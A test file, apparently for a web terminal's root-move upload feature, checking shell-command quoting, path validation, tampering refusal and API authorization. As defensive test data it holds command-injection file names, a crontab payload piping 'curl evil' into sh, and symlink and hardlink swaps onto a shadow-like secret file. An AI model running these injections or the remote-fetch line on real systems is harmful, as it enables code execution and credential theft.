"""3.6.9 — uploads into folders the agent's user cannot write, and agents on a too-old Python.

Hermetic (temp DB, fake agent, no network). Covers:
  * rootmove: strerror sanitising, folder/name/user validation, the generated inbox names, the
    `sudo sh -c` command and its shlex round-trip — including injection attempts (quotes, $(),
    backticks, newlines, ESC, bidi overrides, NUL) — the plans (owner index, expiry, eviction), and
    the command EXECUTED by a real shell with a fake `sudo` (as root: reading as `nobody` through
    setpriv): names land literally, nothing in them runs, mode 0644, and a staged file swapped for
    other content, a symlink, a hardlink or /dev/zero after staging is refused with nothing landing
    (review M1);
  * error mapping: files.failedReason / files.agentInternal, and the write-error enrichment
    ({user, dir[, mode]}) with a fake agent;
  * the routes POST /api/hosts/{id}/fs/root-move and …/{plan_id}/command: authentication,
    authorization (Viewer refused, Operator/Owner allowed, an Operator scoped to another host
    refused), validation, the agent's inbox path and user checked, only the planner may upload into
    a staged file or get its command, the command carries the SHA-256 of the bytes that streamed
    through the gateway, and every way that hash could be incomplete yields no command;
  * the upload route returning the enriched code end to end;
  * core.agent_python_old: the os.scandir fingerprint, the OS hint, the fs_list probe settling it,
    and the System health check.
"""
import asyncio
import hashlib
import os
import shlex
import shutil
import subprocess
import sys
import tempfile

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import rbac_util as U  # noqa: E402  (sets the env before `app` is imported)
from app import api, core, db, rootmove, syshealth  # noqa: E402

check = U.Checker()
INBOX = "/home/webterm/.webterm/inbox"
NASTY = ["it's", "$(touch PWNED1)", "`touch PWNED2`", "a b", "-rf", "--", "&&", "ș file.txt",
         "x;touch PWNED3", "*", "~root", "!!", "a\"b", "%self", "{a,b}", "a#b", "a%sb%n"]


# ── pure: rootmove ───────────────────────────────────────────────────────────────────────────
def pure_checks():
    print("── rootmove (pure)")
    check("reason: strerror without the path", rootmove.reason("/x/y: Permission denied") == "Permission denied")
    check("reason: control/bidi characters neutralised",
          rootmove.reason("/x: bad\x1b[31m‮thing\r\n") == "bad [31m thing", repr(rootmove.reason("/x: bad\x1b[31m‮thing\r\n")))
    long = rootmove.reason("/x: " + "a" * 500)
    check("reason: truncated", len(long) <= rootmove.REASON_MAX and long.endswith("…"))
    check("reason: non-string → ''", rootmove.reason(None) == "")

    good_dirs = ["/", "/srv/bin/lists", "/srv/it's $(x) `y`", "/a b/ș"]
    bad_dirs = ["", "relative/x", "//srv", "/srv/../etc", "/srv/./x", "/srv/", "/a\nb", "/a\rb",
                "/a\x1b[201~b", "/a‮b", "/a\x00b", "/a b", "/" + "a" * 5000, None, 5]
    check("check_dir: accepts absolute normalised paths, odd characters included",
          all(rootmove.check_dir(d) == d for d in good_dirs))
    rejected = []
    for d in bad_dirs:
        try:
            rootmove.check_dir(d)
        except rootmove.MoveError:
            rejected.append(d)
    check("check_dir: rejects relative, //, ., .., trailing /, control/bidi/NUL/separators, too long",
          len(rejected) == len(bad_dirs), [d for d in bad_dirs if d not in rejected])

    bad_names = ["", ".", "..", "a/b", "a\rb", "a\nb", "\x1b[201~", "a‮b", "a\x00b",
                 "x" * 256, "ș" * 128, None]
    check("check_name: accepts odd but legal names", all(rootmove.check_name(n) == n for n in NASTY))
    rej = 0
    for n in bad_names:
        try:
            rootmove.check_name(n)
        except rootmove.MoveError:
            rej += 1
    check("check_name: rejects empty/./../paths/control/bidi/NUL/>255 bytes", rej == len(bad_names), rej)

    # re-review M2: fish reads a backslash inside '…' as an escape → refused everywhere
    bs = 0
    for fn, v in ((rootmove.check_name, "a\\"), (rootmove.check_name, "a\\x;id>pwn;#"),
                  (rootmove.check_name, "\\"), (rootmove.check_dir, "/srv/a\\"), (rootmove.check_dir, "/srv/a\\b/c")):
        try:
            fn(v)
        except rootmove.MoveBackslash:
            bs += 1
        except rootmove.MoveError:
            pass
    check("M2: a backslash in a name or the folder → MoveBackslash (a MoveError)",
          bs == 5 and issubclass(rootmove.MoveBackslash, rootmove.MoveError), bs)

    n1 = rootmove.inbox_name(0)
    check("inbox_name: generated (stamp + random), safe charset",
          rootmove._INBOX_NAME_RE.match(n1) is not None and n1.startswith("1970-01-01_00-00-00_root-move_"), n1)
    check("inbox_name: random part differs", rootmove.inbox_name(0) != rootmove.inbox_name(0))


    ups = rootmove.staged_paths(INBOX, NASTY)
    srcs = [u["upload_path"] for u in ups]
    check("staged_paths: one staged file per name, all under the inbox, names never in the staged path",
          len(srcs) == len(NASTY) and all(s.startswith(INBOX + "/") for s in srcs)
          and not any(n in s.rsplit("/", 1)[1] for n, s in zip(NASTY, srcs) if len(n) > 2))
    items = [dict(u, size=i, sha256="%064x" % i) for i, u in enumerate(ups)]
    cmd = rootmove.command("webterm", INBOX, "/srv/it's $(x)", items)
    argv = shlex.split(cmd)
    want = ["sudo", "sh", "-c", rootmove.MOVE_SCRIPT, "webterm-move", "webterm", "/srv/it's $(x)"]
    for i, (n, s) in enumerate(zip(NASTY, srcs)):
        want += [s, str(i), "%064x" % i, "/srv/it's $(x)/" + n]
    check("command: parses to EXACTLY the intended argv (script constant, values positional)", argv == want)
    check("command: no newline / control characters in the command",
          "\n" not in cmd and not rootmove.has_bad_chars(cmd))
    check("M2: no backslash anywhere in the command (fish), script included",
          "\\" not in cmd and "\\" not in rootmove.MOVE_SCRIPT)
    check("M2: no bare token starts with % or ~ (fish expands %self)",
          not any(shlex.quote(t)[:1] in ("%", "~") for t in shlex.split(cmd))
          and " ".join(shlex.quote(t) for t in shlex.split(cmd)) == cmd)
    check("command: the script is a constant without single quotes or newlines",
          "'" not in rootmove.MOVE_SCRIPT and "\n" not in rootmove.MOVE_SCRIPT)
    check("command: reads as the agent's user, checks the SHA-256, mv -T, removes the temp on failure",
          'sudo -u "$u" -- head -c "$z" -- "$s"' in rootmove.MOVE_SCRIPT
          and '[ "${x%% *}" = "$h" ]' in rootmove.MOVE_SCRIPT and "mv -f -T --" in rootmove.MOVE_SCRIPT
          and "trap c EXIT" in rootmove.MOVE_SCRIPT and "sudo install" not in rootmove.MOVE_SCRIPT)
    check("L2: messages via printf \"%s\", no echo with an argument (dash's echo reads escapes)",
          'printf "webterm: %s" "$1"' in rootmove.MOVE_SCRIPT
          and not any(w.startswith('"') or w.startswith("$") for w in
                      [p.split("echo", 1)[1].strip()[:1] for p in rootmove.MOVE_SCRIPT.split(";") if "echo" in p] if w))
    one = rootmove.staged_paths(INBOX, ["a"])
    one_cmd = rootmove.command("webterm", INBOX, "/", [dict(one[0], size=1, sha256="0" * 64)])
    check("command: root folder → /<name>", shlex.split(one_cmd)[-1] == "/a")
    for bad, what in ((["a", "a"], "duplicates"), ([], "no files"), (["x"] * 21, "too many")):
        try:
            rootmove.staged_paths(INBOX, bad)
            check("staged_paths: refuses " + what, False)
        except rootmove.MoveError:
            check("staged_paths: refuses " + what, True)
    for inbox in ("relative/.webterm/inbox", "/home/x/other", "/home/x/.webterm/inbox/", "/a\n/.webterm/inbox", ""):
        try:
            rootmove.staged_paths(inbox, ["a"])
            check("staged_paths: refuses agent inbox %r" % inbox, False)
        except rootmove.MoveError:
            check("staged_paths: refuses agent inbox %r" % inbox, True)
    good = dict(one[0], size=1, sha256="0" * 64)
    for user in ("", None, "-rf", "#0", "root$", "a b", "a;id", "$(id)", "Web", "x" * 33, "a\nb"):
        try:
            rootmove.command(user, INBOX, "/srv", [good])
            check("command: refuses agent user %r" % (user,), False)
        except rootmove.MoveError:
            check("command: refuses agent user %r" % (user,), True)
    for it, what in ((dict(good, upload_path=INBOX + "/evil"), "a staged path WebTerm did not generate"),
                     (dict(good, upload_path="/etc/shadow"), "a path outside the inbox"),
                     (dict(good, sha256="Z" * 64), "a bad hash"), (dict(good, sha256=None), "no hash"),
                     (dict(good, size=-1), "a negative size"), (dict(good, size=True), "a bool size"),
                     (dict(good, size="1"), "a string size"), (dict(good, name="a/b"), "a path as name")):
        try:
            rootmove.command("webterm", INBOX, "/srv", [it])
            check("command: refuses " + what, False)
        except rootmove.MoveError:
            check("command: refuses " + what, True)
    try:
        rootmove.command("webterm", INBOX, "/srv", [good, dict(good)])
        check("command: refuses duplicate names", False)
    except rootmove.MoveError:
        check("command: refuses duplicate names", True)

    # plans: owner index, expiry, eviction
    p, _ = rootmove.new_plan(7, 1, INBOX, "/srv", ["a", "b"], now=1000.0)
    check("plan: staged paths are owned by the planner on that host",
          rootmove.staged_owner(7, p["uploads"][0]["upload_path"]) == 1
          and rootmove.staged_owner(8, p["uploads"][0]["upload_path"]) is None
          and rootmove.staged_owner(7, "/etc/passwd") is None)
    check("plan: found while live, gone after the TTL",
          rootmove.get_plan(p["plan_id"], now=1001.0) is p
          and rootmove.get_plan(p["plan_id"], now=1000.0 + rootmove.PLAN_TTL + 1) is None)
    rootmove.drop_plan(p["plan_id"])
    check("plan: dropped → its staged paths are free", rootmove.staged_owner(7, p["uploads"][0]["upload_path"]) is None)
    saved = rootmove.MAX_PLANS
    rootmove.MAX_PLANS = 2
    try:
        p1, _ = rootmove.new_plan(7, 1, INBOX, "/srv", ["a"], now=2000.0)
        p2, _ = rootmove.new_plan(7, 1, INBOX, "/srv", ["a"], now=2001.0)
        p3, dropped = rootmove.new_plan(7, 1, INBOX, "/srv", ["a"], now=2002.0)
        check("plan: beyond MAX_PLANS the oldest is evicted (and reported)",
              [d["plan_id"] for d in dropped] == [p1["plan_id"]] and rootmove.get_plan(p1["plan_id"], now=2003.0) is None
              and rootmove.get_plan(p3["plan_id"], now=2003.0) is p3)
        for q in (p2, p3):
            rootmove.drop_plan(q["plan_id"])
    finally:
        rootmove.MAX_PLANS = saved


def _sha(b: bytes) -> str:
    return hashlib.sha256(b).hexdigest()


def shell_checks():
    """The command, run by a real /bin/sh with a fake `sudo`. Without root: `sudo -u U --` runs the
    command as the test user. As root with setpriv: as `nobody`, which proves the staged file is
    read as the agent's user, not as root."""
    print("── rootmove: the command executed by a real shell")
    as_root = os.geteuid() == 0 and shutil.which("setpriv") is not None
    try:
        import pwd
        nobody = pwd.getpwnam("nobody")
    except (ImportError, KeyError):
        nobody = None
    as_root = as_root and nobody is not None
    agent_user = "nobody" if as_root else "webterm"
    base = tempfile.mkdtemp()
    os.chmod(base, 0o755)
    try:
        home = os.path.join(base, "home")
        inbox = os.path.join(home, ".webterm", "inbox")
        target = os.path.join(base, "srv", "it's $(touch PWNED0) `touch PWNED00`")
        os.makedirs(inbox)
        os.makedirs(target)
        for d in (home, os.path.join(home, ".webterm"), inbox, os.path.dirname(target)):
            os.chmod(d, 0o755)
        if as_root:
            os.chown(inbox, nobody.pw_uid, nobody.pw_gid)      # the agent's user owns its inbox
        bindir = os.path.join(base, "bin")
        os.makedirs(bindir)
        with open(os.path.join(bindir, "sudo"), "w") as f:
            f.write('#!/bin/sh\n'
                    'if [ "$1" = -u ]; then u=$2; shift 2; [ "$1" = -- ] && shift\n'
                    '  if [ -n "${WT_SETPRIV:-}" ]; then\n'
                    '    exec setpriv --reuid="$(id -u "$u")" --regid="$(id -g "$u")" --clear-groups -- "$@"\n'
                    '  fi\n'
                    'fi\n'
                    'exec "$@"\n')
        os.chmod(os.path.join(bindir, "sudo"), 0o755)
        env = dict(os.environ, PATH=bindir + ":" + os.environ.get("PATH", "/usr/bin:/bin"))
        if as_root:
            env["WT_SETPRIV"] = "1"

        def stage(names, contents):
            ups = rootmove.staged_paths(inbox, names)
            items = []
            for u, c in zip(ups, contents):
                with open(u["upload_path"], "wb") as f:
                    f.write(c)
                os.chmod(u["upload_path"], 0o644)
                if as_root:
                    os.chown(u["upload_path"], nobody.pw_uid, nobody.pw_gid)
                items.append(dict(u, size=len(c), sha256=_sha(c)))
            return items

        def run(items, timeout=30):
            cmd = rootmove.command(agent_user, inbox, target, items)
            return subprocess.run(["/bin/sh", "-c", cmd], cwd=base, env=env,
                                  capture_output=True, text=True, timeout=timeout)

        def temps():
            return [n for n in os.listdir(target) if n.startswith(".webterm-move.")]

        contents = [("content-%d\n" % i).encode() for i in range(len(NASTY))]
        items = stage(NASTY, contents)
        r = run(items)
        check("shell: the command succeeds (%s)" % ("as root, reading as nobody" if as_root else "fake sudo"),
              r.returncode == 0, r.stderr[-300:])
        landed = sorted(n for n in os.listdir(target))
        check("shell: every name landed literally in the target folder", landed == sorted(NASTY), landed)
        ok_content = all(open(os.path.join(target, n), "rb").read() == contents[i] for i, n in enumerate(NASTY))
        check("shell: each file has its own content", ok_content)
        check("shell: installed with mode 0644",
              all(oct(os.stat(os.path.join(target, n)).st_mode & 0o777) == "0o644" for n in NASTY))
        check("shell: owned by the user running the command (root when run as root)",
              all(os.stat(os.path.join(target, n)).st_uid == os.geteuid() for n in NASTY))
        check("shell: the staged inbox files were removed", os.listdir(inbox) == [])
        check("shell: no temp file left behind", temps() == [])
        want_out = ["webterm: installed %s/%s" % (target, n) for n in NASTY]
        check("L2: each message printed literally (printf %s, a % in a name stays a %)",
              r.stdout.splitlines() == want_out, r.stdout[-300:])
        for n in NASTY:
            os.unlink(os.path.join(target, n))

        # ── tampering after staging: each must be refused, nothing lands, no temp left ──
        secret = os.path.join(base, "secret")
        with open(secret, "wb") as f:
            f.write(b"root:$6$hash:19000:0:99999:7:::\n")
        os.chmod(secret, 0o600)

        def refused(what, mutate, name="victim.conf", content=b"good content\n", same_as_secret=False):
            if same_as_secret:
                content = open(secret, "rb").read()
            it = stage([name], [content])
            mutate(it[0]["upload_path"])
            try:
                r = run(it, timeout=20)
                rc, err = r.returncode, r.stderr
            except subprocess.TimeoutExpired:
                rc, err = "timeout", ""
            check("tamper: %s → refused, nothing lands, no temp left" % what,
                  rc not in (0, "timeout") and not os.path.lexists(os.path.join(target, name)) and temps() == []
                  and "NOT installed" in err, (rc, err[-200:], os.listdir(target)))
            for n in os.listdir(inbox):
                os.unlink(os.path.join(inbox, n))

        def swap_content(p):
            with open(p, "wb") as f:
                f.write(b"* * * * * root curl evil | sh\n")

        def swap_symlink(p):
            os.unlink(p)
            os.symlink(secret, p)

        def swap_hardlink(p):
            os.unlink(p)
            os.link(secret, p)

        def swap_zero(p):
            os.unlink(p)
            os.symlink("/dev/zero", p)

        def append(p):
            with open(p, "ab") as f:
                f.write(b"extra")

        def remove(p):
            os.unlink(p)

        refused("content swapped (another upload over the staged file)", swap_content)
        refused("symlink to a secret file", swap_symlink)
        refused("hardlink to a secret file", swap_hardlink)
        refused("symlink to /dev/zero (at most <size> bytes read, no disk fill)", swap_zero)
        refused("staged file deleted", remove)
        # bytes appended: only <size> bytes are read, so what lands is EXACTLY what was uploaded
        it = stage(["grown.conf"], [b"uploaded\n"])
        append(it[0]["upload_path"])
        r = run(it)
        check("tamper: bytes appended → only the uploaded bytes land (head -c <size>)",
              r.returncode == 0 and open(os.path.join(target, "grown.conf"), "rb").read() == b"uploaded\n", r.stderr[-200:])
        os.unlink(os.path.join(target, "grown.conf"))
        if as_root:
            # the hash WOULD match here (same bytes) — only reading as the agent's user stops it
            refused("symlink to a root-only file with the SAME bytes (read as the agent's user fails)",
                    swap_symlink, same_as_secret=True)
            refused("hardlink to a root-only file with the SAME bytes", swap_hardlink, same_as_secret=True)
        else:
            check("tamper: read-as-agent-user test skipped (needs root + setpriv)", True)

        # the destination is an existing directory: mv -T refuses, nothing is moved INTO it
        os.makedirs(os.path.join(target, "adir"))
        it = stage(["adir"], [b"x"])
        r = run(it)
        check("dest is a directory → refused, nothing moved into it, no temp left",
              r.returncode != 0 and os.listdir(os.path.join(target, "adir")) == [] and temps() == [], r.stderr[-200:])
        os.rmdir(os.path.join(target, "adir"))
        for n in os.listdir(inbox):
            os.unlink(os.path.join(inbox, n))

        # two files, the second tampered: the first lands, the second does not, the command stops
        it = stage(["one.txt", "two.txt"], [b"1", b"2"])
        swap_content(it[1]["upload_path"])
        r = run(it)
        check("two files, the second swapped → first installed, second refused, exit != 0",
              r.returncode != 0 and open(os.path.join(target, "one.txt"), "rb").read() == b"1"
              and not os.path.exists(os.path.join(target, "two.txt")) and temps() == [], r.stderr[-200:])

        pwned = []
        for _root, _dirs, files in os.walk(base):
            pwned += [f for f in files if f.startswith("PWNED")]
        check("shell: nothing in a name or the folder was executed", not pwned, pwned)
    finally:
        shutil.rmtree(base, ignore_errors=True)

# ── fake agent ───────────────────────────────────────────────────────────────────────────────
class FakeAgent(core.AgentConnection):
    def __init__(self, host_id, deny=(), inbox=INBOX, ver=58):
        self.host_id = host_id
        self.agent_version = ver
        self.deny = set(deny)
        self.inbox = inbox
        self.calls = []
        self.sizes = {}          # temp files written through fs_write_bin -> size (for upload/status)

    async def fs_write_bin(self, path, offset, block, timeout=60.0):
        d = os.path.dirname(path)
        if d in self.deny:
            return {"ok": False, "id": 1, "code": "fs_error", "msg": "%s: Permission denied" % path}
        self.sizes[path] = offset + len(block)
        return {"ok": True, "written": len(block), "offset": offset + len(block), "crc32": None}

    async def request(self, op, timeout=20.0, **kw):
        self.calls.append((op, kw))
        if op == "fs_mkdir":
            if kw["path"] == rootmove.INBOX_REL:
                return {"ok": True, "path": self.inbox}
            if os.path.dirname(kw["path"]) in self.deny:
                return {"ok": False, "code": "fs_error", "msg": "%s: Permission denied" % kw["path"]}
            return {"ok": True, "path": kw["path"]}
        if op == "fs_stat":
            if kw["path"] in self.sizes:
                return {"ok": True, "exists": True, "size": self.sizes[kw["path"]], "dir": False}
            if kw["path"] in self.deny:
                return {"ok": True, "exists": True, "size": 4096, "dir": True, "mode": 0o755}
            return {"ok": True, "exists": False, "size": 0}
        if op in ("fs_rename", "fs_delete"):
            self.sizes.pop(kw["path"], None)
        if op == "fs_list":
            return {"ok": True, "path": kw.get("path"), "parent": "/", "entries": [], "truncated": False}
        return {"ok": True}


async def mapping_checks():
    print("── error mapping")
    r = api._file_api_error(core.FileError("/srv/x: Input/output error"))
    check("unknown strerror → files.failedReason + sanitised reason",
          r.code == "files.failedReason" and r.vars == {"reason": "Input/output error"}, (r.code, r.vars))
    r = api._file_api_error(core.FileError("eroare"))
    check("no message from the agent → plain files.failed", r.code == "files.failed" and not r.vars)
    r = api._file_api_error(core.FileError("agent internal error: '__exit__'"))
    check("agent internal error → files.agentInternal + its text",
          r.code == "files.agentInternal" and r.vars.get("reason") == "'__exit__'", (r.code, r.vars))
    r = api._file_api_error(core.FileError("agent internal error: [Errno 2] No such file: '/x'"))
    check("internal wins over the substring table (not files.notFound)", r.code == "files.agentInternal")
    check("copy rows: codes needing {reason} fall back to files.failed",
          api._copy_code_of("agent internal error: x") == "files.failed"
          and api._copy_code_of("/x: weird") == "files.failed")

    owner = await U.owner_client()
    hid = await U.add_host(owner, "lists-host")
    await db.execute("UPDATE hosts SET agent_user='webterm' WHERE id=?", hid)
    fake = FakeAgent(hid, deny={"/srv/bin/lists"})
    core.sources[hid] = fake
    try:
        e = await api._fs_write_error(hid, core.FileError("/srv/bin/lists/a.wtpart.x: Permission denied"),
                                      "/srv/bin/lists/a")
        check("permission denied → files.writeDeniedMode {user, dir, mode}",
              e.code == "files.writeDeniedMode" and e.vars == {"user": "webterm", "dir": "/srv/bin/lists", "mode": "755"},
              (e.code, e.vars))
        e = await api._fs_write_error(hid, core.FileError("/srv/other/a: Permission denied"), "/srv/other/a")
        check("mode unknown (fs_stat says missing) → files.writeDenied without mode",
              e.code == "files.writeDenied" and "mode" not in e.vars, (e.code, e.vars))
        e = await api._fs_write_error(hid, core.FileError("/sys/a: Read-only file system"), "/sys/a")
        check("read-only → files.readOnlyAt {dir}", e.code == "files.readOnlyAt" and e.vars.get("dir") == "/sys")
        e = await api._fs_write_error(hid, core.FileError("/v/a: No space left on device"), "/v/a")
        check("no space → files.noSpaceAt", e.code == "files.noSpaceAt")
        e = await api._fs_write_error(hid, core.FileError("/nope/a: No such file or directory"), "/nope/a")
        check("missing folder on a write → files.dirMissing", e.code == "files.dirMissing")
        e = await api._fs_write_error(hid, core.FileError("/x/a: No such file or directory"), "/x/a",
                                      missing_is_dir=False)
        check("missing on delete/commit stays files.notFound", e.code == "files.notFound")
        e = await api._fs_write_error(hid, core.FileError("/x/a\x1b[2J: Permission denied"), "/x/a\x1b[2J")
        check("a control character in the folder is neutralised for display",
              "\x1b" not in e.vars.get("dir", "") and e.vars.get("dir") == "/x", e.vars)
        await db.execute("UPDATE hosts SET agent_user=NULL WHERE id=?", hid)
        e = await api._fs_write_error(hid, core.FileError("/srv/bin/lists/a: Permission denied"), "/srv/bin/lists/a")
        check("agent user unknown → plain files.permissionDenied", e.code == "files.permissionDenied")
        e = await api._fs_write_error(hid, core.FileError("/sys/a: Read-only file system"), "/sys/a")
        check("agent user unknown → read-only still names the folder (no user needed)",
              e.code == "files.readOnlyAt" and e.vars == {"dir": "/sys"}, (e.code, e.vars))
        await db.execute("UPDATE hosts SET agent_user='webterm' WHERE id=?", hid)

        # the upload route end to end: body carries code + vars
        r = await owner.post("/api/hosts/%d/fs/upload?path=%s&upload_id=%s&offset=0"
                             % (hid, "/srv/bin/lists/f.txt", "a" * 32), content=b"hello")
        j = r.json()
        check("upload route: 400 files.writeDeniedMode with {user, dir, mode} in the body",
              r.status_code == 400 and j.get("code") == "files.writeDeniedMode"
              and j.get("vars") == {"user": "webterm", "dir": "/srv/bin/lists", "mode": "755"}, (r.status_code, j))
        r = await owner.post("/api/hosts/%d/fs/mkdir" % hid, json={"path": "/srv/bin/lists/sub"})
        check("mkdir route: enriched too", r.json().get("code") == "files.writeDeniedMode", r.text)
    finally:
        core.sources.pop(hid, None)
    return owner, hid


async def _upload(client, hid, path, chunks, uid="b" * 32, commit=True):
    off = 0
    for c in chunks:
        r = await client.post("/api/hosts/%d/fs/upload?path=%s&upload_id=%s&offset=%d" % (hid, path, uid, off), content=c)
        if r.status_code != 200:
            return r
        off += len(c)
    if not commit:
        return r
    return await client.post("/api/hosts/%d/fs/upload/commit?path=%s&upload_id=%s" % (hid, path, uid))


async def route_checks(owner, hid):
    print("── POST /fs/root-move + …/command")
    url = "/api/hosts/%d/fs/root-move" % hid
    fake = FakeAgent(hid, deny={"/srv/bin/lists"})
    core.sources[hid] = fake
    try:
        anon = U.client()
        r = await anon.post(url, json={"dir": "/srv/bin/lists", "names": ["a"]})
        check("unauthenticated → 401", r.status_code == 401, r.status_code)

        other = await U.add_host(owner, "other-host")
        await U.add_user("viewer@x.co", bindings=[("viewer", "all", "")])
        await U.add_user("op@x.co", bindings=[("operator", "all", "")])
        await U.add_user("op-other@x.co", bindings=[("operator", "host", other)])
        viewer = await U.login("viewer@x.co")
        op = await U.login("op@x.co")
        op_other = await U.login("op-other@x.co")
        r = await viewer.post(url, json={"dir": "/srv/bin/lists", "names": ["a"]})
        check("Viewer (no files.write) → refused", r.status_code in (403, 404), r.status_code)
        r = await op_other.post(url, json={"dir": "/srv/bin/lists", "names": ["a"]})
        check("Operator scoped to ANOTHER host → refused", r.status_code in (403, 404), r.status_code)
        r = await op.post(url, json={"dir": "/srv/bin/lists", "names": ["list.txt"]})
        j = r.json()
        check("Operator with files.write → 200 + plan (no command before the upload)",
              r.status_code == 200 and j.get("plan_id") and "command" not in j, r.text[:200])

        r = await owner.post(url, json={"dir": "/srv/bin/lists", "names": ["it's", "$(id)"]})
        j = r.json()
        plan_id, ups = j.get("plan_id"), j.get("uploads") or []
        check("Owner → 200; staged files in the agent's inbox, named by WebTerm",
              r.status_code == 200 and len(ups) == 2
              and all(u["upload_path"].startswith(INBOX + "/") and "root-move_" in u["upload_path"] for u in ups), j)
        check("the agent was asked to create its inbox", ("fs_mkdir", {"path": rootmove.INBOX_REL, "parents": True}) in fake.calls)
        row = await db.fetchone("SELECT detail FROM audit_log WHERE path=? ORDER BY id DESC LIMIT 1", url)
        check("audited: 'upload and move as root … (planned)'",
              row and "move as root" in row["detail"] and "planned" in row["detail"], row and row["detail"])
        cmd_url = "%s/%s/command" % (url, plan_id)

        r = await owner.post(cmd_url)
        check("command before the uploads → 409 files.rootMoveNotStaged",
              r.status_code == 409 and r.json().get("code") == "files.rootMoveNotStaged", r.text[:160])
        r = await op.post("/api/hosts/%d/fs/upload?path=%s&upload_id=%s&offset=0" % (hid, ups[0]["upload_path"], "c" * 32),
                          content=b"evil")
        check("another user uploading into a staged file → 403 files.rootMoveForeign",
              r.status_code == 403 and r.json().get("code") == "files.rootMoveForeign", (r.status_code, r.text[:160]))
        for sub in ("status", "commit"):
            meth = op.get if sub == "status" else op.post
            r = await meth("/api/hosts/%d/fs/upload/%s?path=%s&upload_id=%s" % (hid, sub, ups[0]["upload_path"], "c" * 32))
            check("another user: upload/%s on a staged file → 403" % sub, r.status_code == 403, r.status_code)
        r = await op.delete("/api/hosts/%d/fs/upload?path=%s&upload_id=%s" % (hid, ups[0]["upload_path"], "c" * 32))
        check("another user: abort on a staged file → 403", r.status_code == 403, r.status_code)

        data = [b"#!/bin/sh\necho one\n", b"second file\n"]
        r1 = await _upload(owner, hid, ups[0]["upload_path"], [data[0][:7], data[0][7:]])
        r2 = await _upload(owner, hid, ups[1]["upload_path"], [data[1]], uid="d" * 32)
        check("the planner uploads both (chunked) and commits", r1.status_code == 200 and r2.status_code == 200,
              (r1.status_code, r2.status_code, r2.text[:120]))
        r = await op.post(cmd_url)
        check("another user asking for the command → 404 (not theirs)", r.status_code == 404, r.status_code)
        r = await owner.post(cmd_url)
        j = r.json()
        argv = shlex.split(j.get("command", ""))
        want = ["sudo", "sh", "-c", rootmove.MOVE_SCRIPT, "webterm-move", "webterm", "/srv/bin/lists",
                ups[0]["upload_path"], str(len(data[0])), hashlib.sha256(data[0]).hexdigest(), "/srv/bin/lists/it's",
                ups[1]["upload_path"], str(len(data[1])), hashlib.sha256(data[1]).hexdigest(), "/srv/bin/lists/$(id)"]
        check("command: the SHA-256 and size of the bytes that went through the gateway, round-trips exactly",
              r.status_code == 200 and argv == want, (r.status_code, argv[4:]))
        row = await db.fetchone("SELECT detail FROM audit_log WHERE path=? ORDER BY id DESC LIMIT 1", cmd_url)
        check("audited: the command (typed or copied, not run)", row and "not run" in row["detail"], row and row["detail"])
        r = await owner.post(cmd_url)
        check("the plan is used up: a second command → 404 files.rootMoveGone",
              r.status_code == 404 and r.json().get("code") == "files.rootMoveGone", r.status_code)
        r = await owner.post("/api/hosts/%d/fs/upload?path=%s&upload_id=%s&offset=0" % (hid, ups[0]["upload_path"], "e" * 32),
                             content=b"x")
        check("after the plan: the path is an ordinary path again (no owner lock)", r.status_code == 200, r.status_code)

        # broken hashes: no command
        async def broken(what, act):
            r = await owner.post(url, json={"dir": "/srv/bin/lists", "names": ["f.conf"]})
            p = r.json()
            path = p["uploads"][0]["upload_path"]
            await act(path)
            r = await owner.post("%s/%s/command" % (url, p["plan_id"]))
            check("no command when %s → 409 files.rootMoveNotStaged" % what,
                  r.status_code == 409 and r.json().get("code") == "files.rootMoveNotStaged", (r.status_code, r.text[:120]))

        async def two_ids(path):
            await _upload(owner, hid, path, [b"abc"], uid="1" * 32, commit=False)
            await _upload(owner, hid, path, [b"abc"], uid="2" * 32)

        async def one_shot(path):
            await owner.post("/api/hosts/%d/fs/upload?path=%s" % (hid, path), content=b"abc")

        async def not_committed(path):
            await _upload(owner, hid, path, [b"abc"], commit=False)

        async def resumed_after_restart(path):
            await _upload(owner, hid, path, [b"abc"], uid="3" * 32, commit=False)
            core.stage_track(hid, path)              # a fresh hash state, as after a gateway restart
            await owner.post("/api/hosts/%d/fs/upload?path=%s&upload_id=%s&offset=3" % (hid, path, "3" * 32), content=b"def")
            await owner.post("/api/hosts/%d/fs/upload/commit?path=%s&upload_id=%s" % (hid, path, "3" * 32))

        await broken("two upload ids went into one staged file", two_ids)
        await broken("the staged file was written one-shot (not hashed)", one_shot)
        await broken("the upload never committed", not_committed)
        await broken("the hash state missed the first bytes (resume after a restart)", resumed_after_restart)

        r = await owner.post(url, json={"dir": "/srv/bin/lists", "names": ["z"]})
        p = r.json()
        await _upload(owner, hid, p["uploads"][0]["upload_path"], [b"zz"], uid="4" * 32, commit=False)
        await owner.delete("/api/hosts/%d/fs/upload?path=%s&upload_id=%s" % (hid, p["uploads"][0]["upload_path"], "4" * 32))
        await _upload(owner, hid, p["uploads"][0]["upload_path"], [b"zz2"], uid="5" * 32)
        r = await owner.post("%s/%s/command" % (url, p["plan_id"]))
        check("aborted and uploaded again (new id) → the command hashes the new bytes",
              r.status_code == 200 and hashlib.sha256(b"zz2").hexdigest() in r.json().get("command", ""), r.text[:120])

        # the agent's user: unknown or odd → no plan at all
        for au, what in ((None, "unknown"), ("web term", "with a space"), ("-x", "an option"), ("root$(id)", "with $()")):
            await db.execute("UPDATE hosts SET agent_user=? WHERE id=?", au, hid)
            r = await owner.post(url, json={"dir": "/srv/bin/lists", "names": ["a"]})
            check("agent user %s → 409 files.rootMoveNoUser" % what,
                  r.status_code == 409 and r.json().get("code") == "files.rootMoveNoUser", (r.status_code, r.text[:120]))
        await db.execute("UPDATE hosts SET agent_user='webterm' WHERE id=?", hid)

        for body, what in (({"dir": "srv/x", "names": ["a"]}, "relative folder"),
                           ({"dir": "/srv/x\n", "names": ["a"]}, "newline in folder"),
                           ({"dir": "/srv/x", "names": ["a\nb"]}, "newline in name"),
                           ({"dir": "/srv/x", "names": ["\x1b[201~x"]}, "ESC in name"),
                           ({"dir": "/srv/x", "names": ["a/b"]}, "path as name"),
                           ({"dir": "/srv/x", "names": [5]}, "non-string name"),
                           ({"dir": "/srv/x", "names": []}, "no names")):
            r = await owner.post(url, json=body)
            check("refused: " + what + " → 400 files.rootMoveBad",
                  r.status_code == 400 and r.json().get("code") == "files.rootMoveBad", (r.status_code, r.text[:120]))
        for body, what in (({"dir": "/srv/x", "names": ["a\\"]}, "name ending in a backslash"),
                           ({"dir": "/srv/x", "names": ["a\\x;id>pwn;#"]}, "backslash + injection"),
                           ({"dir": "/srv/a\\b", "names": ["a"]}, "backslash in the folder")):
            r = await owner.post(url, json=body)
